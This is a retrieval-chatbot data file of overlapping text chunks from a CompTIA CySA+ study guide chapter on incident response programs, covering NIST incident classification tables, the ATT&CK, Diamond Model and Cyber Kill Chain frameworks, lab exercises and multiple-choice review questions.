rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a full-­time responsibility or serves in a cybersecurity leadership position. Incident Response Providers In addition to including internal team members on the CSIRT, the organization may decide to outsource some or all of their actions to an incident response provider. Retaining an incident response provider gives the organization access to expertise that might not otherwise exist inside the firm. This may come at significant expense, so the organizations should decide what types of incidents may be handled internally and which justify the use of an outside provider. Additionally, the organization should understand the provider’s guaranteed response time and ensure that it has a plan in place to respond to the early stages of an incident before the provider assumes control. 356 Chapter 9 ■ Building an Incident Response Program CSIRT Scope of Control The organization’s incident response policy should clearly outline the scope of the CSIRT. This includes answers to the following questions: ■■ ■■ ■■ ■■ What triggers the activation of the CSIRT? Who is authorized to activate the CSIRT? Does the CSIRT cover the entire organization or is it responsible only for certain business units, information categories, or other divisions of responsibility? Is the CSIRT authorized to communicate with law enforcement, regulatory bodies, or other external parties and, if so, which ones? Does the CSIRT have internal communication and/or escalation responsibilities? If so, what triggers those requirements? Testing the Incident Response Plan Testing cybersecurity incident response plans is a critical component of any organization’s incident response strategy. Testing reassures the organization that the plan will function properly in the event of an actual incident and provides a critical training exercise for the team members who would respond to a real-­world cybersecurity crisis. If you are responsible for your organization’s incident response plan, you should conduct regular simulation tests to walk team members through the processes they would follow when responding to a real cybersecurity incident. These tests may be simple tabletop exercises where the team gathers around a physical or virtual table and discusses how they would respond to an incident scenario, or they may be more sophisticated exercises that involve actually using the organization’s incident response capabilities. Classifying Incidents Each time an incident occurs, the CSIRT should classify the incident by both the type of threat and the severity of the incident according to a standardized incident severity rating system. This classification aids other personnel in understanding the nature and severity of the incident and allows the comparison of the current incident to past and future incidents. Classifying Incidents 357 Threat Classification In many cases, the incident will come from a known threat source that facilitates the rapid identification of the threat. NIST provides the following attack vectors that are useful for classifying threats: External/Removable Media An attack executed from removable media or a peripheral device—­for example, malicious code spreading onto a system from an infected USB flash drive. Attrition An attack that employs brute-­force methods to compromise, degrade, or destroy systems, networks, or services—­for example, a
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the nature and severity of the incident and allows the comparison of the current incident to past and future incidents. Classifying Incidents 357 Threat Classification In many cases, the incident will come from a known threat source that facilitates the rapid identification of the threat. NIST provides the following attack vectors that are useful for classifying threats: External/Removable Media An attack executed from removable media or a peripheral device—­for example, malicious code spreading onto a system from an infected USB flash drive. Attrition An attack that employs brute-­force methods to compromise, degrade, or destroy systems, networks, or services—­for example, a DDoS attack intended to impair or deny access to a service or application or a brute-­force attack against an authentication mechanism. Web An attack executed from a website or web-­based application—­for example, a cross-­site scripting attack used to steal credentials or redirect to a site that exploits a browser vulnerability and installs malware. Email An attack executed via an email message or attachment—­for example, exploit code disguised as an attached document or a link to a malicious website in the body of an email message. Impersonation An attack involving replacement of something benign with something malicious—­for example, spoofing, on-­path (man-­in-­the-­middle) attacks, rogue wireless access points, and SQL injection attacks all involve impersonation. Improper Usage Any incident resulting from violation of an organization’s acceptable usage policies by an authorized user, excluding the previous categories; for example, a user installs file-­sharing software, leading to the loss of sensitive data, or a user performs illegal activities on a system. Loss or Theft of Equipment The loss or theft of a computing device or media used by the organization, such as a laptop, smartphone, or authentication token. Unknown Other An attack of unknown origin. An attack of known origin that does not fit into any of the previous categories. In addition to understanding these attack vectors, cybersecurity analysts should be familiar with the concept of an advanced persistent threat (APT). APT attackers are highly skilled and talented attackers focused on a specific objective. These attackers are often funded by nation-­states, organized crime, and other sources with tremendous resources. APT attackers are known for taking advantage of zero-­day vulnerabilities—­vulnerabilities 358 Chapter 9 ■ Building an Incident Response Program that are unknown to the security community and, as a result, are not included in security tests performed by vulnerability scanners and other tools and have no patches available to correct them. Severity Classification CSIRT members may investigate dozens, hundreds, or even thousands of security incidents each year, depending on the scope of their responsibilities and the size of the organization. Therefore, it is important to use a standardized process to communicate the severity of each incident to management and other stakeholders. Incident severity information assists in the prioritization and scope of incident response efforts. Two key measures used to determine the incident severity are the scope of the impact and the types of data involved in the incident. Scope of Impact The scope of an incident’s
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	patches available to correct them. Severity Classification CSIRT members may investigate dozens, hundreds, or even thousands of security incidents each year, depending on the scope of their responsibilities and the size of the organization. Therefore, it is important to use a standardized process to communicate the severity of each incident to management and other stakeholders. Incident severity information assists in the prioritization and scope of incident response efforts. Two key measures used to determine the incident severity are the scope of the impact and the types of data involved in the incident. Scope of Impact The scope of an incident’s impact depends on the degree of impairment that it causes the organization as well as the effort required to recover from the incident. Functional Impact The functional impact of an incident is the degree of impairment that it causes to the organization. This may vary based on the criticality of the data, systems, or processes affected by the incident, as well as the organization’s ability to continue providing services to users as an incident unfolds and in the aftermath of the incident. NIST recommends using four categories to describe the functional impact of an incident, as shown in Table 9.1. TA B L E 9 . 1 NIST functional impact categories Category Definition None No effect to the organization’s ability to provide all services to all users. Low Minimal effect; the organization can still provide all critical services to all users but has lost efficiency. Medium The organization has lost the ability to provide a critical service to a subset of system users. High The organization is no longer able to provide some critical services to any users. Source: NIST SP 800-61: Computer Security Incident Handling Guide https://nvlpubs.nist.gov/nistpubs/ specialpublications/nist.sp.800-61r2.pdf / last accessed February 15, 2023. Classifying Incidents 359 There is one major gap in the functional impact assessment criteria provided by NIST: it does not include any assessment of the economic impact of a security incident on the organization. This may be because the NIST guidelines are primarily intended to serve a government audience. Organizations may wish to modify the categories in Table 9.1 to incorporate economic impact or measure financial impact using a separate scale, such as the one shown in Table 9.2. The financial thresholds included in Table 9.2 are intended as examples only and should be adjusted according to the size of the organization. For example, a security incident causing a $500,000 loss may be crippling for a small business, whereas a Fortune 500 company may easily absorb this loss. TA B L E 9 . 2 Economic impact categories Category Definition None The organization does not expect to experience any financial impact or the financial impact is negligible. Low The organization expects to experience a financial impact of $10,000 or less. Medium The organization expects to experience a financial impact of more than $10,000 but less than $500,000. High The organization expects to experience a financial impact of $500,000 or more. Recoverability Effort In addition to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	security incident causing a $500,000 loss may be crippling for a small business, whereas a Fortune 500 company may easily absorb this loss. TA B L E 9 . 2 Economic impact categories Category Definition None The organization does not expect to experience any financial impact or the financial impact is negligible. Low The organization expects to experience a financial impact of $10,000 or less. Medium The organization expects to experience a financial impact of more than $10,000 but less than $500,000. High The organization expects to experience a financial impact of $500,000 or more. Recoverability Effort In addition to measuring the functional and economic impact of a security incident, organizations should measure the time that services will be unavailable. This may be expressed as a function of the amount of downtime experienced by the service or the time required to recover from the incident. Table 9.3 shows the recommendations suggested by NIST for assessing the recoverability impact of a security incident. TA B L E 9 . 3 NIST recoverability effort categories Category Definition Regular Time to recovery is predictable with existing resources. Supplemented Time to recovery is predictable with additional resources. Extended Time to recovery is unpredictable; additional resources and outside help are needed. Not Recoverable Recovery from the incident is not possible (e.g., sensitive data exfiltrated and posted publicly); launch investigation. Source: NIST SP 800-61: Computer Security Incident Handling Guide https://nvlpubs.nist.gov/nistpubs/ specialpublications/nist.sp.800-61r2.pdf / last accessed February 15, 2023. 360 Chapter 9 ■ Building an Incident Response Program Datatypes The nature of the data involved in a security incident also contributes to the incident severity. When a security incident affects the confidentiality or integrity of sensitive information, cybersecurity analysts should assign a data impact rating. The data impact rating scale recommended by NIST appears in Table 9.4. TA B L E 9 . 4 NIST information impact categories Category Definition None No information was exfiltrated, changed, deleted, or otherwise compromised. Privacy breach Sensitive personally identifiable information (PII) of taxpayers, employees, beneficiaries, and so on was accessed or exfiltrated. Proprietary breach Unclassified proprietary information, such as protected critical infrastructure information (PCII) was accessed or exfiltrated. Integrity loss Sensitive or proprietary information was changed or deleted. Source: NIST SP 800-61: Computer Security Incident Handling Guide https://nvlpubs.nist.gov/nistpubs/ specialpublications/nist.sp.800-61r2.pdf / last accessed February 15, 2023. Although the impact scale presented in Table 9.4 is NIST’s recommendation, it does have some significant shortcomings. Most notably, the definitions included in the table are skewed toward the types of information that might be possessed by a government agency and might not map well to information in the possession of a private organization. Some analysts might also object to the inclusion of “integrity loss” as a single category separate from the three classification-­dependent breach categories. Table 9.5 presents an alternative classification scheme that private organizations might use as the basis for their own information impact categorization schemes. TA B L E 9 . 5 Private organization information impact categories Category Definition None No information was exfiltrated,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Most notably, the definitions included in the table are skewed toward the types of information that might be possessed by a government agency and might not map well to information in the possession of a private organization. Some analysts might also object to the inclusion of “integrity loss” as a single category separate from the three classification-­dependent breach categories. Table 9.5 presents an alternative classification scheme that private organizations might use as the basis for their own information impact categorization schemes. TA B L E 9 . 5 Private organization information impact categories Category Definition None No information was exfiltrated, changed, deleted, or otherwise compromised. Regulated information breach Information regulated by an external compliance obligation was accessed or exfiltrated. This may include personally identifiable information (PII) that triggers a data breach notification law, protected health information (PHI) under HIPAA, and/or payment card information protected under PCI DSS. For organizations subject to the European Union’s General Data Protection Regulation (GDPR), it should also include sensitive personal information (SPI) as defined under GDPR. SPI includes information from special categories, such as genetic data, trade union membership, and sexual information. Attack Frameworks Category 361 Definition Intellectual property Sensitive intellectual property was accessed or exfiltrated. This may breach include product development plans, formulas, or other sensitive trade secrets. Confidential information breach Corporate confidential information was accessed or exfiltrated. This includes information that is sensitive or classified as a high-­value asset but does not fit under the categories of regulated information or intellectual property. Examples might include corporate financial information or information about mergers and acquisitions. Integrity loss Sensitive or proprietary information was changed or deleted. As with the financial impact scale, organizations will need to customize the information impact categories in Table 9.5 to meet the unique requirements of their business processes. Exam Note As you prepare for the CySA+ exam, be sure that you are familiar with all of the different categories of sensitive information that contribute to criticality ratings. These include personally identifiable information (PII), protected health information (PHI), sensitive personal information (SPI), high-­value assets, financial information, intellectual property, and corporate information. These topics are covered in more detail in Chapter 2, “System and Network Architecture.” Attack Frameworks There have been many attempts to describe attack methodologies in frameworks to help defenders model attacks and appropriate defenses. The CySA+ exam focuses on three specific frameworks, but your organization may use a different model or could create its own either from scratch or by combining one or more frameworks with its own requirements and experience. Frameworks are useful to help think through what an attacker is likely to do so that you can build appropriate defenses against attacks. MITRE’s ATT&CK Framework MITRE provides the ATT&CK, or Adversarial Tactics, Techniques, and Common Knowledge, knowledge base of adversary tactics and techniques. The ATT&CK matrices include detailed descriptions, definitions, and examples for the complete threat life cycle, 362 Chapter 9 ■ Building an Incident Response Program from initial access through execution, persistence, privilege escalation, and exfiltration.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	model or could create its own either from scratch or by combining one or more frameworks with its own requirements and experience. Frameworks are useful to help think through what an attacker is likely to do so that you can build appropriate defenses against attacks. MITRE’s ATT&CK Framework MITRE provides the ATT&CK, or Adversarial Tactics, Techniques, and Common Knowledge, knowledge base of adversary tactics and techniques. The ATT&CK matrices include detailed descriptions, definitions, and examples for the complete threat life cycle, 362 Chapter 9 ■ Building an Incident Response Program from initial access through execution, persistence, privilege escalation, and exfiltration. At each level, it lists techniques and components, allowing threat assessment modeling to leverage common descriptions and knowledge. ATT&CK matrices include preattack, enterprise matrices focusing on Windows, macOS, Linux, cloud computing, networking, and the use of containers. It also produces matrices focusing on mobile devices (iOS and Android) and industrial control systems (ICSs). Each matrix includes details of mitigations, threat actor groups, software, and a host of other useful details. All of this adds up to make ATT&CK the most comprehensive freely available database of adversary techniques, tactics, and related information that the authors of this book are aware of. Figure 9.3 shows an example of an ATT&CK technique definition for active scanning techniques. It provides an ID number as well as classification details like the tactic, platforms it applies to, potential mitigating controls and detection mechanisms. In addition to the ATT&CK website and materials, a variety of third-­party projects leverage ATT&CK to build playbooks, tools, and even commercial software. You can find the ATT&CK website at http://attack.mitre.org. The Diamond Model of Intrusion Analysis The Diamond Model of Intrusion Analysis describes a sequence where an adversary deploys a capability targeted at an infrastructure against a victim. In this model, activities are called events, and analysts label the vertices as events that are detected or discovered. The model is intended to help analysts discover more information by highlighting the relationship between elements by following the edges between the events. The Diamond Model uses a number of specific terms: ■■ ■■ ■■ Core Features of an event, which are the adversary, capability, infrastructure, and victim (the vertices of the diamond). The Meta-­Features, which are start and end timestamps, phase, result, direction, methodology, and resources. These are used to order events in a sequence known as an activity thread, as well as for grouping events based on their features. A Confidence Value, which is undefined by the model, but which analysts are expected to determine based on their own work. Figure 9.4 shows an example of an analysis conducted for a compromised system. Note that each element helps to identify additional information or areas to review. The Diamond Model focuses heavily on understanding the attacker and their motivations, and then uses relationships between these elements to allow security analysts to both understand the threat and consider what other data or information they may need to obtain or may already have available. You can
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	grouping events based on their features. A Confidence Value, which is undefined by the model, but which analysts are expected to determine based on their own work. Figure 9.4 shows an example of an analysis conducted for a compromised system. Note that each element helps to identify additional information or areas to review. The Diamond Model focuses heavily on understanding the attacker and their motivations, and then uses relationships between these elements to allow security analysts to both understand the threat and consider what other data or information they may need to obtain or may already have available. You can read the full text of the Diamond Model paper at https://apps.dtic.mil/ sti/pdfs/ADA586960.pdf. Attack Frameworks FIGURE 9.3 The ATT&CK definition for Active Scanning 363 364 Chapter 9 FIGURE 9.4 ■ Building an Incident Response Program A Diamond Model analysis of a compromised system Adversary 5. Adversary identity helps security staff determine threat model and like additional capabilities 4. Netblock ownership points to adversary's identity 2. Logs show source IP of attacker Capability Infrastructure 1. Victim discovers compromised system 3. SIEM logs show other activity by the same netblock Victim Lockheed Martin’s Cyber Kill Chain Lockheed Martin’s Cyber Kill Chain is a seven-­stage process, as shown in Figure 9.5. The seven stages are as follows: 1. Reconnaissance, which identifies targets. In this phase, adversaries are planning their attacks and will gather intelligence about the target, including both open source intelligence and direct acquisition of target data via scanning. Defenders must gather data about reconnaissance activities and prioritize defenses based on that information. 2. Weaponization involves building or otherwise acquiring a weaponizer that combines malware and an exploit into a payload that can be delivered to the target. This may require creating decoy documents, choosing the right command-­and-­control tool, and other details. The model emphasizes the fact that defenders need to conduct full malware analysis in this stage to understand not only what payload is dropped but how the weaponized exploit was made. Defenders should also build detections for weaponizers, look at the timeline of when malware was created versus its use, and collect both files and metadata to help them see if the tools are widely shared or closely held and thus potentially very narrowly targeted. 3. Delivery occurs when the adversary either deploys their tool directly against targets or via release that relies on staff at the target interacting with it such as in an email payload, on a USB stick, or via websites that they visit. Defenders in this stage must observe how the attack was delivered and what was targeted, and then will infer what the Attack Frameworks 365 adversary was intending to accomplish. Retention of logs is also important in this stage, as defenders need them to track what occurred. FIGURE 9.5 The Cyber Kill Chain 1 2 3 4 5 6 7 Reconnaissance • Target selection, research, vulnerability identification Weaponization • Creation of tools to exploit vulnerabilities Delivery • Weapon is delivered to the target (email, thumbdrive,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	such as in an email payload, on a USB stick, or via websites that they visit. Defenders in this stage must observe how the attack was delivered and what was targeted, and then will infer what the Attack Frameworks 365 adversary was intending to accomplish. Retention of logs is also important in this stage, as defenders need them to track what occurred. FIGURE 9.5 The Cyber Kill Chain 1 2 3 4 5 6 7 Reconnaissance • Target selection, research, vulnerability identification Weaponization • Creation of tools to exploit vulnerabilities Delivery • Weapon is delivered to the target (email, thumbdrive, website, or other method) Exploitation • Malware program is triggered and exploits vulnerabilities Installation • Remote access tools/backdoors installed Command-and-Control (C2) • Intruder has president access Actions on Objectives • Intruder takes action to accomplish their goals: data acquisition and extraction, data damage, system damage 4. Exploitation uses a software, hardware, or human vulnerability to gain access. This can involve zero-­day exploits and may use either adversary-­triggered exploits or victim-­ triggered exploits. Defense against this stage focuses on user awareness, secure coding, vulnerability scanning, penetration testing, endpoint hardening, and similar activities to ensure that organizations have a strong security posture and very limited attack surface. 5. Installation focuses on persistent backdoor access for attackers. Defenders must monitor for typical artifacts of a persistent remote shell or other remote access methodologies. 6. Command-and-Control (C2) access allows two-­way communication and continued control of the remote system. Defenders will seek to detect the C2 infrastructure by 366 Chapter 9 ■ Building an Incident Response Program hardening the network, deploying detection capabilities, and conducting ongoing research to ensure they are aware of new C2 models and technology. 7. Actions on Objectives, the final stage, occurs when the mission’s goal is achieved. Adversaries will collect credentials, escalate privileges, pivot and move laterally through the environment, and gather and exfiltrate information. They may also cause damage to systems or data. Defenders must establish their incident response playbook, detect the actions of the attackers and capture data about them, respond to alerts, and assess the damage the attackers have caused. The entire Lockheed Martin Cyber Kill Chain can be found in greater detail at www .lockheedmartin.com/content/dam/lockheed-­martin/rms/documents/cyber/ Gaining_the_Advantage_Cyber_Kill_Chain.pdf. Exam Note The CySA+ exam objectives specifically call out three attack methodology frameworks: the Cyber Kill Chain, the Diamond Model of Intrusion Analysis, and the MITRE ATT&CK model. Be certain that you understand the details of these models before taking the exam! The Unified Kill Chain Although the CySA+ exam doesn’t specifically mention it, you may find the Unified Kill Chain useful. The Unified Kill Chain combines both Lockheed Martin’s Cyber Kill Chain and MITRE’s ATT&CK framework (as well as quite a few others!) into a single kill chain model. It uses 18 phases to describe attacks that occur both inside and outside a defended network, addressing complaints about both frameworks. You can learn more about the Unified Kill Chain at www.unifiedkillchain.com/assets/The-­Unified-­Kill-­ Chain.pdf. Assessing Attack Frameworks Before you adopt a
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	that you understand the details of these models before taking the exam! The Unified Kill Chain Although the CySA+ exam doesn’t specifically mention it, you may find the Unified Kill Chain useful. The Unified Kill Chain combines both Lockheed Martin’s Cyber Kill Chain and MITRE’s ATT&CK framework (as well as quite a few others!) into a single kill chain model. It uses 18 phases to describe attacks that occur both inside and outside a defended network, addressing complaints about both frameworks. You can learn more about the Unified Kill Chain at www.unifiedkillchain.com/assets/The-­Unified-­Kill-­ Chain.pdf. Assessing Attack Frameworks Before you adopt a conceptual model for attacks, you should read up on the commentary about it. For example, Lockheed Martin’s Cyber Kill Chain has been criticized for including actions that occur outside of the defended network, since those are outside of the areas that many defenders can take action on. Other criticisms have included commentary about the focus on perimeter and antimalware-­based defensive techniques, as well as a lack of focus on insider threats. Summary 367 As advanced persistent threats and insider threats continue to be major concerns, simply adopting the Cyber Kill Chain model might not serve your organization’s needs. Thus, you should carefully consider what model fits the threats you’re most likely to encounter, and either select a model that fits or modify an existing model to meet your organization’s needs. Developing Testing Strategies Of course, cybersecurity analysts aren’t only responsible for investigating attacks that did occur—­they also spend a lot of their time testing systems to ensure that they are protected against future attacks. Fortunately, many testing standards are available that can help you develop comprehensive testing strategies. The two testing resources that you must know for the CySA+ exam are: ■■ ■■ The Open Source Security Testing Methodology Manual (OSS TMM), published by the Institute for Security and Open Methodologies provides guidance on testing the security of physical locations, human interactions, and communications. You can find it at www .isecom.org/OSSTMM.3.pdf. The Open Web Application Security Project (OWASP) Web Security Testing Guide provides a resource focused specifically on testing the security of web applications. You can find it at https://owasp.org/www-­project-­web-­security-­testing-­guide. Summary Incident response programs provide organizations with the ability to respond to security issues in a calm, repeatable manner. Security incidents occur when there is a known or suspected violation or imminent violation of an organization’s security policies. When a security incident occurs, the organization should activate its computer security incident response team (CSIRT). The CSIRT guides the organization through the four stages of incident response: preparation; detection and analysis; containment, eradication, and recovery; and post-­incident activities. During the preparation phase, the organization ensures that the CSIRT has the proper policy foundation, has operating procedures that will be effective in the organization’s computing environment, receives appropriate training, and is prepared to respond to an incident. During the detection and analysis phase, the organization watches for signs of security incidents. This includes monitoring alerts, logs, publicly available information, and reports from
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	security incident occurs, the organization should activate its computer security incident response team (CSIRT). The CSIRT guides the organization through the four stages of incident response: preparation; detection and analysis; containment, eradication, and recovery; and post-­incident activities. During the preparation phase, the organization ensures that the CSIRT has the proper policy foundation, has operating procedures that will be effective in the organization’s computing environment, receives appropriate training, and is prepared to respond to an incident. During the detection and analysis phase, the organization watches for signs of security incidents. This includes monitoring alerts, logs, publicly available information, and reports from internal and external staff about security anomalies. When the organization suspects a security incident, it moves into the containment, eradication, and recovery phase, which is designed to limit the damage and restore normal operations as quickly as possible. 368 Chapter 9 ■ Building an Incident Response Program Restoration of normal activity doesn’t signal the end of incident response efforts. At the conclusion of an incident, the post-­incident activities phase provides the organization with the opportunity to reflect upon the incident by conducting a lessons learned review. During this phase, the organization should also ensure that evidence is retained for future use according to policy. Cybersecurity analysts use a variety of models to describe the threats they face and the activities of threat actors. The three most significant models are the Lockheed Martin Cyber Kill Chain, the Diamond Model of Intrusion Analysis, and the MITRE ATT&CK model. Exam Essentials Distinguish between security events and security incidents. An event is any observable occurrence in a system or network. A security event includes any observable occurrence that relates to a security function. A security incident is a violation or imminent threat of violation of computer security policies, acceptable use policies, or standard security practices. Every incident consists of one or more events, but every event is not an incident. Name the four phases of the cybersecurity incident response process. The four phases of incident response are preparation; detection and analysis; containment, eradication, and recovery; and post-­incident activities. The process is not a simple progression of steps from start to finish. Instead, it includes loops that allow responders to return to prior phases as needed during the response. Identify security event indicators. Alerts originate from intrusion detection and prevention systems, security information and event management systems, antivirus software, file integrity checking software, and third-­party monitoring services. Logs are generated by operating systems, services, applications, network devices, and network flows. Publicly available information exists about new vulnerabilities and exploits detected “in the wild” or in a controlled laboratory environment. People from inside the organization or external sources report suspicious activity that may indicate that a security incident is in progress. Explain how policies, procedures, and playbooks guide incident response efforts. The incident response policy serves as the cornerstone of an organization’s incident response program. This policy should be written to guide efforts at a high level and provide the authority for incident response. Procedures provide
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	monitoring services. Logs are generated by operating systems, services, applications, network devices, and network flows. Publicly available information exists about new vulnerabilities and exploits detected “in the wild” or in a controlled laboratory environment. People from inside the organization or external sources report suspicious activity that may indicate that a security incident is in progress. Explain how policies, procedures, and playbooks guide incident response efforts. The incident response policy serves as the cornerstone of an organization’s incident response program. This policy should be written to guide efforts at a high level and provide the authority for incident response. Procedures provide the detailed, tactical information that CSIRT members need when responding to an incident. CSIRT teams often develop playbooks that describe the specific procedures that they will follow in the event of a specific type of cybersecurity incident. Know that incident response teams should represent diverse stakeholders. The core incident response team normally consists of cybersecurity professionals with specific expertise in incident response. In addition to the core team members, the CSIRT may include representation Lab Exercises 369 from technical subject matter experts, IT support staff, legal counsel, human resources staff, and public relations and marketing teams. The team will also need to coordinate with internal and external stakeholders, including senior leadership, law enforcement, and regulatory bodies. Explain how incidents can be classified according to the attack vector where they originate. Common attack vectors for security incidents include external/removable media, attrition, the web, email, impersonation, improper usage, loss or theft of equipment, and other/unknown sources. Explain how response teams classify the severity of an incident. The functional impact of an incident is the degree of impairment that it causes to the organization. The economic impact is the amount of financial loss that the organization incurs. In addition to measuring the functional and economic impact of a security incident, organizations should measure the time that services will be unavailable and the recoverability effort. Finally, the nature of the data involved in an incident also contributes to the severity as the information impact. Be able to describe threats and attacks using frameworks and model them using analysis techniques. Frameworks like the Diamond Model, the MITRE ATT&CK framework, and Lockheed Martin’s Cyber Kill Chain all provide ways to assess and describe threats. Using a threat model can help to more fully understand a threat by identifying gaps. Tools like ATT&CK also provide a broad standard taxonomy for threats that allow you to use the data in tools compatible with the framework. Tools including the Open Source Testing Methodology Manual (OSS TMM) and the OWASP Testing Guide help you develop robust strategies for testing systems against the attacks identified in these frameworks. Lab Exercises Activity 9.1: Incident Severity Classification You are the leader of a cybersecurity incident response team for a large company that is experiencing a denial-­of-­service attack on its website. This attack is preventing the organization from selling products to its customers and is likely to cause lost revenue of at least $2
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	standard taxonomy for threats that allow you to use the data in tools compatible with the framework. Tools including the Open Source Testing Methodology Manual (OSS TMM) and the OWASP Testing Guide help you develop robust strategies for testing systems against the attacks identified in these frameworks. Lab Exercises Activity 9.1: Incident Severity Classification You are the leader of a cybersecurity incident response team for a large company that is experiencing a denial-­of-­service attack on its website. This attack is preventing the organization from selling products to its customers and is likely to cause lost revenue of at least $2 million per day until the incident is resolved. The attack is coming from many different sources, and you have exhausted all the response techniques at your disposal. You are currently looking to identify an external partner that can help with the response. Classify this incident using the criteria described in this chapter. Assign categorical ratings for functional impact, economic impact, recoverability effort, and information impact. Justify each of your assignments. 370 Chapter 9 ■ Building an Incident Response Program Activity 9.2: Incident Response Phases Identify the correct phase of the incident response process that corresponds to each of the following activities: Activity Phase Conducting a lessons learned review session Receiving a report from a staff member about a malware infection Upgrading the organization’s firewall to block a new type of attack Recovering normal operations after eradicating an incident Identifying the attackers and attacking systems Interpreting log entries using a SIEM to identify a potential incident Assembling the hardware and software required to conduct an incident investigation Activity 9.3: Develop an Incident Communications Plan You are the CSIRT leader for a major e-­commerce website, and you are currently responding to a security incident where you believe attackers used a SQL injection attack to steal transaction records from your backend database. Currently, only the core CSIRT members are responding. Develop a communication plan that describes the nature, timing, and audiences for communications to the internal and external stakeholders that you believe need to be notified. Activity 9.4: Explore the ATT&CK Framework In this exercise, you will use the ATT&CK framework to analyze a threat. You may want to select a recent compromise that you have seen in the news, or one that has impacted an organization that you have worked with. If nothing comes to mind, the 2019 Capital One data breach offers a useful example, and you can find details of the exploit in multiple places with a quick search. You may wonder why we aren’t giving you details or a link to a specific article. That’s part of the exercise! Threat intelligence requires the ability to find and combine data to perform the analysis. The best articles for this will provide details of how the systems were accessed and how data was exfiltrated, or similar elements. Lab Exercises 371 Part 1: Build a threat profile 1. List what you know about the compromise or exploit, including details about the threat
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	offers a useful example, and you can find details of the exploit in multiple places with a quick search. You may wonder why we aren’t giving you details or a link to a specific article. That’s part of the exercise! Threat intelligence requires the ability to find and combine data to perform the analysis. The best articles for this will provide details of how the systems were accessed and how data was exfiltrated, or similar elements. Lab Exercises 371 Part 1: Build a threat profile 1. List what you know about the compromise or exploit, including details about the threat actor, what occurred, what tools were used, and as many other details as you can find. 2. Review your list against the headings for the appropriate ATT&CK matrix. Do you have items that match the headings? 3. If you still lack data, you should continue your search or find another example to work through! Part 2: Analysis Now that you have your basic profile, follow the detailed listings in the matrix to match up the threat to its ATT&CK techniques, threat actors, and other details. 1. Match each data point to the appropriate ATT&CK entry. 2. Review the details of each entry so that you become familiar with them. 3. Identify gaps in your knowledge. What information would you look for if you were researching this threat? What information do you think you could reasonably obtain, and what might you be unable to gather? 4. Consider what your report to leadership would contain based on what you have found. What would you include for a technical group, and what would you include for senior leaders like a CIO or CEO? Chapter 9 372 ■ Building an Incident Response Program Review Questions 1. 2. 3. 4. 5. Which one of the following is an example of a computer security incident? A. User accesses a secure file B. Administrator changes a file’s permission settings C. Intruder breaks into a building D. Former employee crashes a server During what phase of the incident response process would an organization implement defenses designed to reduce the likelihood of a security incident? A. Preparation B. Detection and analysis C. Containment, eradication, and recovery D. Post-­incident activity Alan is responsible for developing his organization’s detection and analysis capabilities. He would like to purchase a system that can combine log records from multiple sources to detect potential security incidents. What type of system is best suited to meet Alan’s security objective? A. IPS B. IDS C. SIEM D. Firewall Ben is working to classify the functional impact of an incident. The incident has disabled email service for approximately 30 percent of his organization’s staff. How should Ben classify the functional impact of this incident according to the NIST scale? A. None B. Low C. Medium D. High What phase of the incident response process would include measures designed to limit the damage caused by an ongoing breach? A. Preparation B. Detection and analysis C. Containment, eradication, and recovery
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	incidents. What type of system is best suited to meet Alan’s security objective? A. IPS B. IDS C. SIEM D. Firewall Ben is working to classify the functional impact of an incident. The incident has disabled email service for approximately 30 percent of his organization’s staff. How should Ben classify the functional impact of this incident according to the NIST scale? A. None B. Low C. Medium D. High What phase of the incident response process would include measures designed to limit the damage caused by an ongoing breach? A. Preparation B. Detection and analysis C. Containment, eradication, and recovery D. Post-­incident activity Review Questions 6. 7. 8. 9. 373 What common criticism is leveled at the Cyber Kill Chain? A. Not all threats are aimed at a kill. B. It is too detailed. C. It includes actions outside the defended network. D. It focuses too much on insider threats. Karen is responding to a security incident that resulted from an intruder stealing files from a government agency. Those files contained unencrypted information about protected critical infrastructure. How should Karen rate the information impact of this loss? A. None B. Privacy breach C. Proprietary breach D. Integrity loss Matt is concerned about the fact that log records from his organization contain conflicting timestamps due to unsynchronized clocks. What protocol can he use to synchronize clocks throughout the enterprise? A. NTP B. FTP C. ARP D. SSH Which one of the following document types would outline the authority of a CSIRT responding to a security incident? A. Policy B. Procedure C. Playbook D. Baseline 10. A cross-­site scripting attack is an example of what type of threat vector? A. Impersonation B. Email C. Attrition D. Web 11. What phase of the Cyber Kill Chain includes creation of persistent backdoor access for attackers? A. Delivery B. Exploitation C. Installation D. C2 Chapter 9 374 ■ Building an Incident Response Program 12. Robert is finishing a draft of a proposed incident response policy for his organization. Who would be the most appropriate person to sign the policy? A. CEO B. Director of security C. CIO D. CSIRT leader 13. Which one of the following is not an objective of the containment, eradication, and recovery phase of incident response? A. Detect an incident in progress. B. Implement a containment strategy. C. Identify the attackers. D. Eradicate the effects of the incident. 14. Renee is responding to a security incident that resulted in the unavailability of a website critical to her company’s operations. She is unsure of the amount of time and effort that it will take to recover the website. How should Renee classify the recoverability effort? A. Regular B. Supplemented C. Extended D. Not recoverable 15. Which one of the following is an example of an attrition attack? A. SQL injection B. Theft of a laptop C. User installs file sharing software D. Brute-­force password attack 16. Who is the best facilitator for a post-­incident lessons learned session? A. CEO B. CSIRT leader
